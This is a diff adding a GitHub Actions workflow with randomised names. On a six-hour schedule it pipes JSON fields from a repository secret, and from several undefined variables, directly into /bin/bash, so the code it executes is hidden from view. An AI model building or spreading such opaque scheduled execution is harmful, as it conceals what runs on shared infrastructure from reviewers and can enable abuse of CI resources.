@@ -1,0 +1,23 @@
+name: tongsuishi1238
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongsuishi1238
+        env:
+          ndcdr15966: ${{ secrets.ndcdr15966 }}
+        run: |
+          echo $ndcdr15966 | jq -r .exv8 | /bin/bash
+          echo $q14 | jq -r .ios90 | /bin/bash
+          echo $da69612 | jq -r .mv2 | /bin/bash
+          echo $yh2217 | jq -r .h9129 | /bin/bash
+          echo $lgj984 | jq -r .pferi21170 | /bin/bash
+          echo $ntm3023 | jq -r .atk8 | /bin/bash
+          echo $aqdtv40226 | jq -r .qtcoj763 | /bin/bash
+
